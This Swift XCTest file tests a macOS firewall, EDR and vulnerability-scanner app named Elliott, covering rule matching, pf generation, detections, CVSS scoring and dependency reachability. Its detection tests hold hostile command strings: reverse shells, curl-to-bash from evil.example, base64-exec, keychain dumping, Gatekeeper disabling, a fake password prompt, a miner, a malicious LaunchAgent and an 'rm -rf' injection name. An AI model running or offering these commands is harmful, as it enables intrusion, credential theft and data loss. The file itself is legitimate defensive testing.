import XCTest
@testable import Elliott

final class ElliottTests: XCTestCase {
    func event(app: String = "/Applications/Foo.app/Contents/MacOS/Foo", team: String? = "TEAM1", id: String? = "com.foo",
               host: String? = "api.foo.com", ip: String = "1.2.3.4", port: Int = 443, dir: Direction = .outbound) -> FlowEvent {
        FlowEvent(pid: 1, processPath: app, signingID: id, teamID: team, direction: dir, proto: .tcp,
                  localAddress: "192.168.1.5", localPort: dir == .inbound ? 22 : 50000,
                  remoteAddress: ip, remotePort: port, remoteHostname: host, outcome: .allowed)
    }

    func testAppKeyIncludesSigner() {
        XCTAssertEqual(event().appKey, "TEAM1:com.foo")
        XCTAssertEqual(event(team: nil).appKey, "/Applications/Foo.app/Contents/MacOS/Foo", "ad-hoc identifiers aren't trusted")
    }

    func testMostSpecificRuleWinsAndDenyBreaksTies() {
        let e = event()
        let appAll = Rule(appKey: e.appKey, appName: "Foo", direction: .outbound, proto: nil, host: "*", port: nil, verdict: .allow)
        let exactDeny = Rule(key: e.key, appName: "Foo", verdict: .deny)
        XCTAssertEqual(RuleBook.decide(e, rules: [appAll, exactDeny])?.verdict, .deny)
        let exactAllow = Rule(key: e.key, appName: "Foo", verdict: .allow)
        XCTAssertEqual(RuleBook.decide(e, rules: [exactAllow, exactDeny])?.verdict, .deny)
        XCTAssertEqual(RuleBook.decide(event(port: 80), rules: [appAll, exactDeny])?.verdict, .allow)
    }

    func testRuleMatchesByKnownIPWhenHostnameMissing() {
        let r = Rule(key: event().key, appName: "Foo", verdict: .allow, addresses: ["1.2.3.4"])
        XCTAssertTrue(r.matches(event(host: nil)))
        XCTAssertFalse(r.matches(event(host: nil, ip: "9.9.9.9")))
        let wild = Rule(appKey: "*", appName: "", direction: .outbound, proto: .tcp, host: "*.foo.com", port: 443, verdict: .deny)
        XCTAssertTrue(wild.matches(event(host: "cdn.foo.com")))
        XCTAssertFalse(wild.matches(event(host: "evilfoo.com")))
    }

    func testInboundKeyedByLocalPort() {
        let k = event(dir: .inbound).key
        XCTAssertEqual(k.host, "*")
        XCTAssertEqual(k.port, 22)
    }

    func testDNSParse() {
        // Response for example.com A 93.184.216.34, answer name compressed.
        var b: [UInt8] = [0x12, 0x34, 0x81, 0x80, 0, 1, 0, 1, 0, 0, 0, 0]
        b += [7] + Array("example".utf8) + [3] + Array("com".utf8) + [0, 0, 1, 0, 1]
        b += [0xC0, 0x0C, 0, 1, 0, 1, 0, 0, 0x0E, 0x10, 0, 4, 93, 184, 216, 34]
        let out = DNSCache.parse(Data(b))
        XCTAssertEqual(out.first?.0, "93.184.216.34")
        XCTAssertEqual(out.first?.1, "example.com")
    }

    func testNettopParse() {
        let text = """
        ,state,
        apsd.384,,
        tcp4 192.168.1.40:61679<->17.57.147.6:5223,Established,
        sshd.900,,
        tcp4 *:22<->*:*,Listen,
        tcp4 192.168.1.40:22<->203.0.113.9:51515,Established,
        rapportd.643,,
        tcp6 fe80::8a4:6aa6:1c21:f74%en0.54158<->fe80::cb5:c46e:fc55:ebbb%en0.64438,Established,
        """
        let conns = PassiveMonitor.parse(text)
        XCTAssertEqual(conns.count, 3)
        XCTAssertEqual(conns[0].remoteAddr, "17.57.147.6"); XCTAssertEqual(conns[0].remotePort, 5223); XCTAssertFalse(conns[0].inbound)
        XCTAssertTrue(conns[1].inbound); XCTAssertEqual(conns[1].localPort, 22)
        XCTAssertEqual(conns[2].remoteAddr, "fe80::cb5:c46e:fc55:ebbb"); XCTAssertEqual(conns[2].remotePort, 64438)
    }

    func testShadowPlan() {
        let a = Rule(key: event().key, appName: "Foo", verdict: .allow)
        let d = Rule(key: event(app: "/tmp/x", team: nil, id: nil, host: "evil.example", port: 4444).key, appName: "x", verdict: .deny)
        let clash = Rule(key: event(app: "/usr/bin/curl", team: nil, id: nil).key, appName: "curl", verdict: .deny)
        let plan = PolicyPlanner.plan(rules: [a, d, clash], descriptions: [a.id: "Foo's API"], macAddress: "192.168.1.5",
                                      lockdown: true, mirrorLockdown: true)
        XCTAssertEqual(plan.rules.map(\.action), [.deny, .allow, .deny, .deny])
        XCTAssertEqual(plan.rules[0].destination, ["elliott-fqdn-evil.example"])
        XCTAssertEqual(plan.rules[0].service, ["elliott-tcp-4444"])
        XCTAssertEqual(plan.rules[1].source, [PolicyPlanner.macObject])
        XCTAssertTrue(plan.rules[1].description.contains("Foo's API"))
        XCTAssertEqual(plan.rules.last?.name, "elliott-lockdown-inbound")
        XCTAssertEqual(plan.notes.count, 1, "curl deny conflicts with Foo allow on the same destination")
        XCTAssertTrue(PolicyPlanner.ruleElement(plan.rules[1], disabled: false).contains("<action>allow</action>"))
        XCTAssertLessThanOrEqual(PolicyPlanner.objectName("elliott-fqdn-", String(repeating: "a", count: 100)).count, 63)
    }

    func testLLMDecodeTolerantOfFences() throws {
        let a = try LocalLLM.decode("```json\n{\"description\":\"Push\",\"category\":\"system\",\"risk\":120,\"reasons\":[]}\n```", model: "m")
        XCTAssertEqual(a.description, "Push")
        XCTAssertEqual(a.risk, 100)
    }

    func testHeuristics() {
        var p = Profile(event: event(app: "/private/tmp/nc", team: nil, id: nil, host: nil, ip: "45.1.2.3", port: 4444))
        XCTAssertGreaterThanOrEqual(p.heuristic.score, 75)
        p = Profile(event: FlowEvent(pid: 1, processPath: "/usr/libexec/apsd", signingID: "com.apple.apsd", appleSigned: true,
                                     direction: .outbound, proto: .tcp, remoteAddress: "17.57.147.6", remotePort: 5223,
                                     remoteHostname: "courier.push.apple.com", outcome: .allowed))
        XCTAssertLessThan(p.heuristic.score, 25)
    }

    func testPFRules() {
        let allow = Rule(key: event(host: nil).key, appName: "Foo", verdict: .allow)          // host is the IP
        var appWide = Rule(appKey: "TEAM1:com.foo", appName: "Foo", direction: .outbound, proto: nil, host: "*", port: nil, verdict: .allow)
        let deny = Rule(appKey: "*", appName: "", direction: .outbound, proto: .tcp, host: "6.6.6.6", port: 4444, verdict: .deny)
        var expired = Rule(key: event(ip: "7.7.7.7", port: 22).key, appName: "x", verdict: .allow, addresses: ["7.7.7.7"])
        expired.expires = Date().addingTimeInterval(-1)
        var text = PFRules.generate(FilterPolicy(rules: [allow, appWide, deny, expired], lockdown: false))
        XCTAssertTrue(text.contains("block return out quick proto tcp from any to <b"))
        XCTAssertFalse(text.contains("pass out quick"), "outside lockdown only blocks are loaded")
        text = PFRules.generate(FilterPolicy(rules: [allow, appWide, deny, expired], lockdown: true))
        XCTAssertTrue(text.contains("table <b0> const { 1.2.3.4 }"))
        XCTAssertFalse(text.contains("7.7.7.7"), "expired rules are dropped")
        XCTAssertFalse(text.contains("pass out quick proto { tcp udp } from any to any"), "an app-wide allow must not open everything")
        XCTAssertTrue(text.hasSuffix("block drop in quick proto udp all\n"))
        appWide.addresses = ["8.8.4.4"]
        XCTAssertTrue(PFRules.generate(FilterPolicy(rules: [appWide], lockdown: true)).contains("8.8.4.4"))
    }

    func testRuleSentences() {
        let exact = Rule(key: event().key, appName: "Foo", verdict: .allow)
        XCTAssertEqual(exact.sentence, "Allow Foo connecting to api.foo.com on TCP port 443.")
        let everything = Rule(appKey: "*", appName: "", direction: .outbound, proto: nil, host: "*", port: nil, verdict: .deny)
        XCTAssertEqual(everything.sentence, "Block any app connecting to any destination on any port.")
        XCTAssertEqual(everything.scopeLabel, "everything")
        let inbound = Rule(key: event(dir: .inbound).key, appName: "sshd", verdict: .deny)
        XCTAssertEqual(inbound.sentence, "Block anyone connecting in to sshd on TCP port 22.")
    }

    func testIPv4SetParsesFeedFormats() {
        let text = """
        # comment
        ; another
        162.243.103.246
        {"cidr":"1.10.16.0/20","sblid":"SBL256894","rir":"apnic"}
        37.120.213.13\t5
        10.0.0.0/8
        1.10.20.0/24
        """
        let set = IPv4Set(lines: text.split(separator: "\n"))
        XCTAssertTrue(set.contains("162.243.103.246"))
        XCTAssertTrue(set.contains("1.10.31.255"))
        XCTAssertFalse(set.contains("1.10.32.0"))
        XCTAssertTrue(set.contains("37.120.213.13"))
        XCTAssertEqual(set.count, 4, "1.10.20.0/24 merges into 1.10.16.0/20")
    }

    func testOnlyGlobalAddressesAreChecked() {
        for ip in ["10.1.2.3", "192.168.1.1", "100.101.102.103", "127.0.0.1", "169.254.1.1", "224.0.0.251", "fe80::1"] {
            XCTAssertFalse(IPv4Set.isGlobal(ip), ip)
        }
        XCTAssertTrue(IPv4Set.isGlobal("8.8.8.8"))
        XCTAssertTrue(IPv4Set.isGlobal("2606:4700::6812:11aa"))
    }

    private func decision(_ v: Verdict, app: String, host: String, port: Int = 443, team: String = "T") -> Decision {
        var p = Profile(event: event(app: "/Applications/\(app).app/Contents/MacOS/\(app)", team: team, id: app, host: host, port: port))
        p.analysis = Analysis(description: "", category: "web", risk: 10, reasons: [], model: "m")
        return Decision(profile: p, verdict: v, source: .manual, scope: "dest + port")
    }

    func testAdvisorPicksSimilarAndKeepsBothVerdicts() {
        var ds = (0..<15).map { decision(.allow, app: "App\($0)", host: "h\($0).example.org") }
        ds.append(decision(.deny, app: "Zoom", host: "telemetry.zoom.us"))
        ds.append(decision(.allow, app: "Zoom", host: "api.zoom.us"))
        let p = Profile(event: event(app: "/Applications/Zoom.app/Contents/MacOS/Zoom", team: "T", id: "Zoom", host: "logs.zoom.us"))
        let ex = Advisor.examples(for: p, in: ds, limit: 4)
        XCTAssertTrue(ex.prefix(2).allSatisfy { $0.appName == "Zoom" }, "same app and domain rank first")
        XCTAssertTrue(ex.contains { $0.verdict == .deny })
        XCTAssertEqual(Advisor.registrableDomain("a.b.bbc.co.uk"), "bbc.co.uk")
        XCTAssertEqual(Advisor.registrableDomain("logs.zoom.us"), "zoom.us")
    }

    func testSuggestionCannotConfidentlyAllowKnownBad() {
        var p = Profile(event: event())
        p.intel = IntelSummary(reputation: .knownBad, hits: [IntelHit(source: "Feodo Tracker", detail: "botnet C2", severity: .knownBad)])
        var s = Suggestion(verdict: .allow, confidence: 95, rationale: "You allow this app.", basedOn: 20)
        let g = Advisor.guarded(s: &s, p)
        XCTAssertLessThanOrEqual(g.confidence, 40)
        XCTAssertGreaterThanOrEqual(p.riskScore, 75, "a known-bad hit is always critical")
    }

    func testOldSettingsStillLoad() throws {
        let old = #"{"lockdown":true,"trustAppleSigned":false,"approvalTimeout":30,"llm":{"provider":"ollama","baseURL":"http://127.0.0.1:11434","model":"qwen2.5:3b","enabled":true},"pan":{"enabled":false,"host":"","target":"firewall","vsys":"vsys1","deviceGroup":"","macAddress":"","autoSync":true,"createDisabled":false,"mirrorLockdown":true,"commit":false,"commitAdmin":""}}"#
        let s = try JSONDecoder.elliott.decode(AppSettings.self, from: Data(old.utf8))
        XCTAssertTrue(s.lockdown)
        XCTAssertTrue(s.suggestionsEnabled)
        XCTAssertEqual(s.intel, IntelSettings())
    }

    // MARK: EDR

    private func rules(_ cmd: String) -> Set<String> { Set(Detections.commandRules.filter { $0.matches(cmd) }.map(\.id)) }

    func testCommandRulesCatchAttacks() {
        XCTAssertTrue(rules("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").contains("cmd.reverse-shell"))
        XCTAssertTrue(rules("python3 -c import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0)").contains("cmd.reverse-shell"))
        XCTAssertTrue(rules("curl -fsSL http://evil.example/x.sh | bash").contains("cmd.download-exec"))
        XCTAssertTrue(rules("echo ZWNobyBoaQ== | base64 -d | sh").contains("cmd.base64-exec"))
        XCTAssertTrue(rules(#"osascript -e display dialog "macOS needs your password" default answer "" with hidden answer"#).contains("cmd.password-prompt"))
        XCTAssertTrue(rules("security dump-keychain -d login.keychain").contains("cmd.keychain"))
        XCTAssertTrue(rules("xattr -d com.apple.quarantine /tmp/payload").contains("cmd.quarantine-strip"))
        XCTAssertTrue(rules("sudo spctl --master-disable").contains("cmd.defense-off"))
        XCTAssertTrue(rules("./xmrig -o stratum+tcp://pool.example:3333 --donate-level 1").contains("cmd.miner"))
        XCTAssertTrue(rules("launchctl load /Users/Shared/.agent.plist").contains("cmd.launch-temp"))
        XCTAssertTrue(rules("dscl . -append /Groups/admin GroupMembership eve").contains("cmd.account"))
    }

    func testCommandRulesIgnoreEverydayCommands() {
        for cmd in ["/bin/zsh -l", "git status", "curl -fsSL https://example.com -o file.tar.gz", "brew install ollama",
                    "/usr/bin/security find-certificate -c Apple", "python3 manage.py runserver", "ssh user@host",
                    "/Applications/Xcode.app/Contents/MacOS/Xcode", "ls -la /tmp", "xattr -l file.zip",
                    "launchctl list", "base64 -i file.png -o out.txt", "screencapture -i shot.png"] {
            XCTAssertEqual(rules(cmd), [], cmd)
        }
    }

    private func proc(_ path: String, name: String? = nil, uid: UInt32 = 501, args: [String]? = nil) -> ProcInfo {
        ProcInfo(pid: 4242, ppid: 1, uid: uid, start: Date(), name: name ?? (path as NSString).lastPathComponent, path: path, args: args)
    }

    func testProcessRules() {
        let unsigned = CodeID(signingID: nil, teamID: nil, appleSigned: false)
        let apple = CodeID(signingID: "com.apple.x", teamID: nil, appleSigned: true)
        let dev = CodeID(signingID: "com.foo", teamID: "TEAM", appleSigned: false)
        func ids(_ p: ProcInfo, _ id: CodeID, ancestors: [ProcInfo] = [], exists: Bool = true) -> Set<String> {
            Set(Detections.evaluate(p, id: id, ancestors: ancestors, exists: exists).map(\.rule))
        }
        XCTAssertTrue(ids(proc("/private/tmp/.x/update"), unsigned).contains("proc.temp-exec"))
        XCTAssertTrue(ids(proc("/Users/me/Library/.hidden/agent"), unsigned).contains("proc.hidden-exec"))
        XCTAssertFalse(ids(proc("/Users/me/.cargo/bin/rg"), unsigned).contains("proc.hidden-exec"), "dev tool folders are fine")
        XCTAssertFalse(ids(proc("/private/var/folders/x/T/AppTranslocation/A/d/Foo.app/Contents/MacOS/Foo"), unsigned).contains("proc.temp-exec"))
        XCTAssertTrue(ids(proc("/Users/me/Library/mds"), dev).contains("proc.masquerade"))
        XCTAssertFalse(ids(proc("/System/Library/Frameworks/CoreServices.framework/mds"), apple).contains("proc.masquerade"))
        XCTAssertTrue(ids(proc("/Users/me/Downloads/xmrig"), unsigned).contains("proc.tool"))
        XCTAssertTrue(ids(proc("/Users/me/tool", uid: 0), dev).contains("proc.root-userpath"))
        XCTAssertTrue(ids(proc("/usr/local/bin/gone"), dev, exists: false).contains("proc.deleted"))
        let word = proc("/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word")
        XCTAssertTrue(ids(proc("/bin/sh"), apple, ancestors: [word]).contains("chain.document-shell"))
        let terminal = proc("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal")
        XCTAssertTrue(ids(proc("/bin/zsh"), apple, ancestors: [terminal]).isEmpty, "a shell from Terminal is normal")
        XCTAssertTrue(ids(proc("/opt/homebrew/bin/ollama"), dev).isEmpty)
    }

    func testPersistenceAssessment() {
        let m = EDRMonitor()
        let bad = LaunchItem(plist: "/Users/me/Library/LaunchAgents/com.update.plist", label: "com.update",
                             program: "/bin/bash", arguments: ["/bin/bash", "-c", "curl -s http://x.example/p | bash"], modified: Date())
        let rules = Set(m.assess(bad, isNew: true).map(\.draft.rule))
        XCTAssertTrue(rules.isSuperset(of: ["persist.inline-script", "persist.cmd.download-exec", "persist.new"]))
        XCTAssertEqual(m.assess(bad, isNew: true).first { $0.draft.rule == "persist.new" }?.draft.severity, .high)
        let ok = LaunchItem(plist: "/Library/LaunchAgents/com.google.keystone.agent.plist", label: "com.google.keystone.agent",
                            program: "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent",
                            arguments: [], modified: Date())
        XCTAssertTrue(m.assess(ok, isNew: false).isEmpty)
    }

    func testProcessTableReadsOwnArguments() {
        let me = ProcessTable.snapshot(withArgs: true).first { $0.pid == getpid() }
        XCTAssertNotNil(me)
        XCTAssertFalse(me?.args?.isEmpty ?? true)
        XCTAssertEqual(me?.path, ProcessTable.path(getpid()))
    }

    func testStableHashIsStable() {
        XCTAssertEqual(Detections.stableHash("abc"), "ba7816bf8f01")
    }

    func testTriageNeverRecommendsDeletingSystemFiles() {
        let f = Finding(key: "k", rule: "cmd.base64-exec", title: "Decoded payload executed", detail: "", severity: .high,
                        category: .commandLine, mitre: [], path: "/bin/bash")
        let safe = TriageLLM.safeRecommendation("Kill the process and delete /bin/bash", finding: f)
        XCTAssertFalse(safe.contains("delete /bin"))
        var temp = f
        temp.path = "/private/tmp/updater"; temp.category = .process
        XCTAssertEqual(TriageLLM.safeRecommendation("Kill the process and delete /private/tmp/updater", finding: temp),
                       "Kill the process and delete /private/tmp/updater")
        XCTAssertEqual(TriageLLM.firstSentences("One. Two. Three. Four.", 2), "One. Two.")
    }

    func testSystemStagedXPCServicesAreNotFlagged() {
        let p = proc("/private/var/db/com.apple.xpc.roleaccountd.staging/exec/1.2.xpc/Contents/MacOS/com.apple.dt.instruments.dtsecurity",
                     name: "com.apple.dt.instruments.dtsecurity", uid: 0)
        let unreadable = CodeID(signingID: nil, teamID: nil, appleSigned: false)
        XCTAssertTrue(Detections.evaluate(p, id: unreadable, ancestors: [], exists: false).isEmpty)
    }

    // MARK: Vulnerabilities

    func testCVSS31Scores() {
        XCTAssertEqual(CVSS3.score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"), 9.8)
        XCTAssertEqual(CVSS3.score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"), 10.0)
        XCTAssertEqual(CVSS3.score("CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"), 7.2)   // lodash CVE-2021-23337
        XCTAssertEqual(CVSS3.score("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"), 6.1)   // typical XSS
        XCTAssertEqual(CVSS3.score("CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:N"), 0)
        XCTAssertNil(CVSS3.score("CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"))
    }

    private func tempProject(_ files: [String: String]) -> String {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("elliott-test-\(UUID().uuidString)").path
        for (name, body) in files {
            let path = "\(dir)/\(name)"
            try? FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
            try? body.write(toFile: path, atomically: true, encoding: .utf8)
        }
        return dir
    }

    func testLockfileParsers() {
        let dir = tempProject([
            "web/package.json": #"{"dependencies":{"lodash":"^4.17.15"}}"#,
            "web/package-lock.json": #"{"lockfileVersion":3,"packages":{"":{},"node_modules/lodash":{"version":"4.17.15"},"node_modules/a/node_modules/minimist":{"version":"1.2.0"}}}"#,
            "y/yarn.lock": "# yarn lockfile v1\n\n\"@babel/core@^7.0.0\", \"@babel/core@^7.1.0\":\n  version \"7.1.2\"\n",
            "py/requirements.txt": "requests==2.19.0\nflask>=2\n# comment\nPyYAML[extra]==5.3\n",
            "py2/poetry.lock": "[[package]]\nname = \"jinja2\"\nversion = \"2.10\"\n",
            "go/go.mod": "module x\n\nrequire (\n\tgolang.org/x/net v0.7.0\n\tgithub.com/pkg/errors v0.9.1 // indirect\n)\n",
            "rs/Cargo.lock": "[[package]]\nname = \"mine\"\nversion = \"0.1.0\"\n\n[[package]]\nname = \"time\"\nversion = \"0.1.43\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n",
            "rb/Gemfile.lock": "GEM\n  specs:\n    rack (2.0.1)\n      nokogiri\n    nokogiri (1.10.0)\n\nPLATFORMS\n",
        ])
        let all = Inventory.findLockfiles(under: dir).flatMap(Inventory.packages(lockfile:))
        func has(_ eco: String, _ n: String, _ v: String) -> Component? { all.first { $0.ecosystem == eco && $0.name == n && $0.version == v } }
        XCTAssertEqual(has("npm", "lodash", "4.17.15")?.direct, true)
        XCTAssertEqual(has("npm", "minimist", "1.2.0")?.direct, false)
        XCTAssertNotNil(has("npm", "@babel/core", "7.1.2"))
        XCTAssertNotNil(has("PyPI", "requests", "2.19.0"))
        XCTAssertNotNil(has("PyPI", "PyYAML", "5.3"))
        XCTAssertNil(all.first { $0.name == "flask" }, "unpinned requirements have no version to check")
        XCTAssertNotNil(has("PyPI", "jinja2", "2.10"))
        XCTAssertEqual(has("Go", "golang.org/x/net", "0.7.0")?.direct, true)
        XCTAssertEqual(has("Go", "github.com/pkg/errors", "0.9.1")?.direct, false)
        XCTAssertNotNil(has("crates.io", "time", "0.1.43"))
        XCTAssertNil(all.first { $0.name == "mine" }, "the project's own crate isn't a dependency")
        XCTAssertNotNil(has("RubyGems", "rack", "2.0.1"))
        XCTAssertNotNil(has("RubyGems", "nokogiri", "1.10.0"))
    }

    func testReachability() {
        let dir = tempProject([
            "src/render.js": "import _ from 'lodash';\nexport const page = (t, data) => _.template(t)(data);\n",
            "src/util.js": "const qs = require('qs');\nmodule.exports = qs.stringify;\n",
            "app/main.py": "import yaml\nfrom requests import get\n",
        ])
        let js = ReachabilityAnalyzer.index(project: dir, ecosystem: "npm")
        let lodash = Component(kind: .package, ecosystem: "npm", name: "lodash", version: "4.17.15", location: "\(dir)/package-lock.json", direct: true, project: dir)
        var v = Vulnerability(id: "GHSA-35jh-r3h4-6jhm", summary: "Command Injection in lodash",
                              details: "`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the `template` function.")
        let reach = ReachabilityAnalyzer.analyze(lodash, v, files: js)
        XCTAssertEqual(reach.verdict, .reachable)
        XCTAssertTrue(reach.evidence.contains { $0.contains("src/render.js:2") })

        v.details = "Prototype pollution in `zipObjectDeep`."
        XCTAssertEqual(ReachabilityAnalyzer.analyze(lodash, v, files: js).verdict, .imported)

        let minimist = Component(kind: .package, ecosystem: "npm", name: "minimist", version: "1.2.0", location: "", direct: false, project: dir)
        XCTAssertEqual(ReachabilityAnalyzer.analyze(minimist, v, files: js).verdict, .notImported)

        let py = ReachabilityAnalyzer.index(project: dir, ecosystem: "PyPI")
        let pyyaml = Component(kind: .package, ecosystem: "PyPI", name: "PyYAML", version: "5.3", location: "", project: dir)
        XCTAssertEqual(ReachabilityAnalyzer.analyze(pyyaml, Vulnerability(id: "x", summary: "", details: "Unsafe `full_load` allows code execution"), files: py).verdict, .imported)
        let go = Vulnerability(id: "GO-1", summary: "", symbols: ["Tokenizer.Next"])
        XCTAssertEqual(ReachabilityAnalyzer.candidateSymbols(go, package: "x").symbols, ["Next"])
    }

    func testPriorityAndDedupe() {
        let c = Component(kind: .package, ecosystem: "npm", name: "x", version: "1", location: "")
        var f = VulnFinding(component: c, vuln: Vulnerability(id: "A", summary: "", cvssScore: 7.5))
        f.reachability = ReachabilityResult(verdict: .notImported)
        var g = f
        g.reachability = ReachabilityResult(verdict: .reachable)
        g.kev = true
        XCTAssertGreaterThan(g.priority, f.priority)
        XCTAssertEqual(g.priority, 100)
        let scanner = VulnScanner(db: VulnDB(directory: FileManager.default.temporaryDirectory), settings: VulnSettings()) { _, _ in }
        let deduped = scanner.dedupeAliases([Vulnerability(id: "PYSEC-1", aliases: ["CVE-1"], summary: ""),
                                             Vulnerability(id: "GHSA-1", aliases: ["CVE-1"], summary: "", cvssScore: 9.8)])
        XCTAssertEqual(deduped.map(\.id), ["GHSA-1"])
        XCTAssertEqual(Inventory.identify(banner: "SSH-2.0-OpenSSH_9.8")?.version, "9.8")
        XCTAssertEqual(Inventory.identify(banner: "nginx/1.25.3")?.cpe, "a:f5:nginx")
    }

    func testScannerTimeoutAbandonsBlockedWork() async {
        let fast = await VulnScanner.withTimeout(seconds: 2) { 42 }
        XCTAssertEqual(fast, 42)
        let start = Date()
        let slow: Int? = await VulnScanner.withTimeout(seconds: 0.5) { Thread.sleep(forTimeInterval: 5); return 1 }
        XCTAssertNil(slow)
        XCTAssertLessThan(Date().timeIntervalSince(start), 2)
    }

    func testVersionOrderingAndNVDRangeCheck() {
        XCTAssertEqual(Version.compare("3.5.1", "3.5.5"), .orderedAscending)
        XCTAssertEqual(Version.compare("1.128.1", "1.99"), .orderedDescending)
        XCTAssertEqual(Version.compare("1.1.1k", "1.1.1ze"), .orderedAscending)
        XCTAssertEqual(Version.compare("1.0.2", "1.0.2a"), .orderedAscending)
        XCTAssertEqual(Version.compare("7.1.1", "7.1.1"), .orderedSame)
        func cve(_ matches: [[String: Any]]) -> [String: Any] { ["configurations": [["nodes": [["cpeMatch": matches]]]]] }
        let inRange = cve([["vulnerable": true, "criteria": "cpe:2.3:a:openssl:openssl:*:*:*:*:*:*:*:*",
                            "versionStartIncluding": "3.5.0", "versionEndExcluding": "3.5.5"]])
        XCTAssertTrue(VulnDB.affects(inRange, product: "openssl:openssl", version: "3.5.1"))
        XCTAssertFalse(VulnDB.affects(inRange, product: "openssl:openssl", version: "3.5.5"))
        XCTAssertFalse(VulnDB.affects(inRange, product: "openssl:openssl", version: "3.4.9"))
        let platformOnly = cve([["vulnerable": false, "criteria": "cpe:2.3:a:openssl:openssl:*:*:*:*:*:*:*:*"],
                                ["vulnerable": true, "criteria": "cpe:2.3:a:apache:http_server:2.4.37:*:*:*:*:*:*:*"]])
        XCTAssertFalse(VulnDB.affects(platformOnly, product: "openssl:openssl", version: "3.5.1"))
        let exact = cve([["vulnerable": true, "criteria": "cpe:2.3:a:sqlite:sqlite:3.53.4:*:*:*:*:*:*:*"]])
        XCTAssertTrue(VulnDB.affects(exact, product: "sqlite:sqlite", version: "3.53.4"))
        let unbounded = cve([["vulnerable": true, "criteria": "cpe:2.3:a:x:y:*:*:*:*:*:*:*:*"]])
        XCTAssertFalse(VulnDB.affects(unbounded, product: "x:y", version: "1.0"))
    }

    func testFixedVersionsAreUpgradesOnly() {
        XCTAssertEqual(Version.upgrades(["1.0.2zn", "3.0.19", "3.5.5", "3.6.1", "2025-01-13"], from: "3.5.1"), ["3.5.5", "3.6.1"])
    }

    func testVirtualenvInventory() {
        let dir = tempProject([
            "backend/requirements.txt": "Pillow>=10.4\n",
            "backend/.venv/pyvenv.cfg": "home = /usr/bin\n",
            "backend/.venv/lib/python3.13/site-packages/pillow-10.4.0.dist-info/METADATA": "Metadata-Version: 2.1\nName: pillow\nVersion: 10.4.0\n",
            "backend/.venv/lib/python3.13/site-packages/numpy-1.26.4.dist-info/METADATA": "Name: numpy\nVersion: 1.26.4\n",
        ])
        let locks = Inventory.findLockfiles(under: dir)
        XCTAssertTrue(locks.contains { $0.hasSuffix(".venv/pyvenv.cfg") })
        let pkgs = locks.flatMap(Inventory.packages(lockfile:))
        let pillow = pkgs.first { $0.name == "pillow" && $0.version == "10.4.0" }
        XCTAssertEqual(pillow?.direct, true)
        XCTAssertEqual(pillow?.project, "\(dir)/backend")
        XCTAssertEqual(pkgs.first { $0.name == "numpy" }?.direct, false)
    }

    func testTransitiveUseAndGenericCalls() {
        let dir = tempProject([
            "app/main.py": "from fastapi import FastAPI\nfrom transformers import AutoModel\nm = AutoModel.from_pretrained('x')\n",
        ])
        let files = ReachabilityAnalyzer.index(project: dir, ecosystem: "PyPI")
        func pkg(_ n: String, requires: [String]? = nil) -> Component {
            var c = Component(kind: .package, ecosystem: "PyPI", name: n, version: "1", location: "", direct: false, project: dir)
            c.requires = requires
            return c
        }
        let comps = [pkg("fastapi", requires: ["starlette", "python-multipart"]), pkg("starlette", requires: ["anyio"]),
                     pkg("python-multipart"), pkg("anyio"), pkg("transformers")]
        let imported = ReachabilityAnalyzer.importedPackages(comps, files: files)
        XCTAssertEqual(imported, ["fastapi", "transformers"])
        let graph = Dictionary(uniqueKeysWithValues: comps.compactMap { c in c.requires.map { (c.name, $0) } })
        let via = ReachabilityAnalyzer.path(to: "anyio", from: imported, graph: graph)
        XCTAssertEqual(via, ["fastapi", "starlette", "anyio"])
        let r = ReachabilityAnalyzer.analyze(comps[3], Vulnerability(id: "x", summary: ""), files: files, via: via)
        XCTAssertEqual(r.verdict, .imported)
        XCTAssertTrue(r.evidence[0].contains("fastapi → starlette → anyio"))

        let generic = Vulnerability(id: "y", summary: "", details: "RCE when `LightGlueConfig` is loaded via `from_pretrained()`")
        XCTAssertEqual(ReachabilityAnalyzer.analyze(comps[4], generic, files: files).verdict, .imported, "from_pretrained alone isn't the vulnerable path")
        let specific = Vulnerability(id: "z", summary: "", details: "Unsafe deserialization in `AutoModel`")
        XCTAssertEqual(ReachabilityAnalyzer.analyze(comps[4], specific, files: files).verdict, .reachable)
    }

    // MARK: Remediation

    func testRepinAndMajorDetection() {
        let req = "# deps\nfastapi==0.115.6\npython_multipart[extra]==0.0.17  # forms\nPillow>=10.4\nnumpy\n"
        let out = RemediationPlanner.repin(requirements: req, package: "python-multipart", to: "0.0.22")
        XCTAssertTrue(out.contains("python_multipart[extra]==0.0.22  # forms"))
        XCTAssertTrue(out.contains("fastapi==0.115.6"), "other lines untouched")
        XCTAssertTrue(RemediationPlanner.repin(requirements: req, package: "pillow", to: "10.4.1").contains("Pillow>=10.4.1"))
        XCTAssertTrue(RemediationPlanner.isMajor(from: "4.46.3", to: "5.0.0"))
        XCTAssertFalse(RemediationPlanner.isMajor(from: "4.46.3", to: "4.48.0"))
        XCTAssertTrue(RemediationPlanner.isMajor(from: "0.41.3", to: "0.49.1"), "0.x minor bumps are breaking")
        XCTAssertFalse(RemediationPlanner.isMajor(from: "0.0.17", to: "0.0.22"))
        XCTAssertFalse(RemediationPlanner.validName("evil; rm -rf ~"))
    }

    private func finding(_ c: Component, _ id: String, fixes: [String], score: Double = 8) -> VulnFinding {
        VulnFinding(component: c, vuln: Vulnerability(id: id, summary: "", cvssScore: score, fixedVersions: fixes))
    }

    func testPlanPicksOneTargetFixingEverything() {
        let dir = tempProject(["requirements.txt": "transformers==4.46.3\n"])
